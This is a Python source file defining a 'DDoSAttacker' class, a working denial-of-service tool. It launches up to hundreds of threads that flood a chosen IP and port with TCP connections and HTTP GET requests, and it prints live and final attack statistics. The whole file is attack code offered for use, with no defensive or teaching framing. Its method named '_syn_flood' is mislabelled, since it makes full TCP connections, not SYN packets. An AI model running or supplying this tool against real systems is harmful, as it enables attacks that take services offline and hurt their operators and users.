import socket
import threading
import requests
import time
from datetime import datetime

class DDoSAttacker:
    def __init__(self, target_ip, target_port=80, threads=100):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = threads
        self.is_attacking = False
        self.attack_threads = []
        self.stats = {
            'start_time': None,
            'total_requests': 0,
            'failed_requests': 0,
            'last_update': None
        }

    def _update_stats(self, success=True):
        self.stats['total_requests'] += 1
        if not success:
            self.stats['failed_requests'] += 1
        self.stats['last_update'] = datetime.now()

    def _print_stats(self):
        duration = datetime.now() - self.stats['start_time']
        req_per_sec = self.stats['total_requests'] / max(duration.total_seconds(), 1)
        print(f"\n\033[93m[+] Attack Stats:\033[0m")
        print(f"\033[94mTarget:\033[0m {self.target_ip}:{self.target_port}")
        print(f"\033[94mDuration:\033[0m {duration}")
        print(f"\033[94mThreads:\033[0m {len(self.attack_threads)}")
        print(f"\033[94mRequests:\033[0m {self.stats['total_requests']} (\033[92m{req_per_sec:.1f}/sec\033[0m)")
        print(f"\033[94mFailed:\033[0m \033[91m{self.stats['failed_requests']}\033[0m")
        print("\033[93mPress Ctrl+C to stop...\033[0m\n")

    def _syn_flood(self):
        while self.is_attacking:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.target_ip, self.target_port))
                s.sendall(b"GET / HTTP/1.1\r\nHost: " + self.target_ip.encode() + b"\r\n\r\n")
                s.close()
                self._update_stats(success=True)
            except:
                self._update_stats(success=False)
                time.sleep(0.1)

    def _http_flood(self):
        while self.is_attacking:
            try:
                requests.get(
                    f"http://{self.target_ip}:{self.target_port}",
                    timeout=1,
                    headers={'User-Agent': 'Mozilla/5.0'}
                )
                self._update_stats(success=True)
            except:
                self._update_stats(success=False)
                time.sleep(0.1)

    def start_attack(self, attack_type="syn"):
        """Start DDoS attack with visual feedback"""
        if self.is_attacking:
            print("\033[91m[!] Attack is already running\033[0m")
            return

        print(f"\n\033[91m[!] Starting {attack_type.upper()} attack on {self.target_ip}:{self.target_port}\033[0m")
        print(f"\033[93m[!] Using {self.threads} threads\033[0m")
        print("\033[91m[!] Press Ctrl+C to stop the attack\033[0m\n")

        self.is_attacking = True
        self.stats = {
            'start_time': datetime.now(),
            'total_requests': 0,
            'failed_requests': 0,
            'last_update': datetime.now()
        }

        # Start attack threads
        self.attack_threads = []
        for i in range(self.threads):
            t = threading.Thread(
                target=self._syn_flood if attack_type == "syn" else self._http_flood,
                daemon=True,
                name=f"AttackThread-{i}"
            )
            t.start()
            self.attack_threads.append(t)

        
        stats_thread = threading.Thread(target=self._stats_display, daemon=True)
        stats_thread.start()

    def _stats_display(self):
        """Display real-time attack statistics"""
        while self.is_attacking:
            self._print_stats()
            time.sleep(5)  

    def stop_attack(self):
        """Stop the attack gracefully"""
        if not self.is_attacking:
            print("\033[91m[!] No attack is currently running\033[0m")
            return

        self.is_attacking = False
        final_stats = self._print_final_stats()

        for t in self.attack_threads:
            t.join(timeout=1)

        return final_stats

    def _print_final_stats(self):
 
        duration = datetime.now() - self.stats['start_time']
        req_per_sec = self.stats['total_requests'] / max(duration.total_seconds(), 1)
        
        print("\n\033[91m[!] ATTACK STOPPED\033[0m")
        print("\033[94m=== Final Statistics ===\033[0m")
        print(f"\033[94mTarget:\033[0m {self.target_ip}:{self.target_port}")
        print(f"\033[94mDuration:\033[0m {duration}")
        print(f"\033[94mTotal Requests:\033[0m \033[92m{self.stats['total_requests']}\033[0m")
        print(f"\033[94mRequest Rate:\033[0m \033[92m{req_per_sec:.1f} requests/second\033[0m")
        print(f"\033[94mFailed Requests:\033[0m \033[91m{self.stats['failed_requests']}\033[0m")
        print("\033[94m=======================\033[0m")
        
        return self.stats